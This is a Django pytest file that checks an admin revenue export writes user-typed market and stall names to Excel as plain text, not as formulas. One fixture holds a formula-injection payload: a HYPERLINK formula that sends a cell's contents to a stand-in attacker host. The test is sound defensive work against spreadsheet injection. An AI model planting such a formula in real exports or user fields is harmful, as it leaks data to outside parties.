"""AD-b: names typed by users are exported as text, never as Excel formulas."""

from io import BytesIO

import pytest
from django.urls import reverse
from django.utils import timezone
from openpyxl import load_workbook

from orders.models import OrderStatus

EXPORT_URL = "admin-report-export"
STALL_FORMULA = '=HYPERLINK("http://attacker.example/?leak="&A1,"Open")'
MARKET_FORMULA = "=1+1"


@pytest.mark.django_db
def test_formula_like_names_are_exported_as_plain_text(admin_client, market, approved_farmer, make_order):
    approved_farmer.stall_name = STALL_FORMULA
    approved_farmer.save(update_fields=["stall_name"])
    market.name = MARKET_FORMULA
    market.save(update_fields=["name"])
    today = timezone.localdate()
    make_order(pickup_date=today, status=OrderStatus.COMPLETED, total="10.00")

    response = admin_client.get(reverse(EXPORT_URL), {"from": str(today), "to": str(today)})

    assert response.status_code == 200
    workbook = load_workbook(BytesIO(response.content))
    market_cell = workbook["Revenue by market"]["A2"]
    stall_cell = workbook["Top farmers"]["A2"]
    assert (market_cell.value, market_cell.data_type) == (MARKET_FORMULA, "s")
    assert (stall_cell.value, stall_cell.data_type) == (STALL_FORMULA, "s")
    # Numbers stay numbers so Excel can still sum the revenue column.
    assert workbook["Revenue by market"]["C2"].data_type == "n"
